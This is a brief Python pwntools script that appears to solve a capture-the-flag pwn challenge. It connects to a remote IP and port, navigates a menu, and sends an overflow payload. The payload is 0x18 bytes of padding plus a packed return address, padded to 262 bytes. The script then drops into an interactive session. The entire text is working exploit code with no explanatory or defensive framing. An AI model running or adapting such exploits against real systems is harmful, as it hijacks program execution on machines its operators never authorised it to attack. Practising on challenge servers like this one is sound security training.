```
from pwn import *
context.log_level='debug'
sh=remote('61.147.171.105',57288)
sh.recv()
sh.sendline(b'1')
sh.recv()
sh.sendline(b'aaaa')
sh.recv()
pl = b'a'*(0x14+0x04) + p32(0x08048694)
pl+=b'a'*(262-len(pl))
sh.sendline(pl)
sh.interactive()
```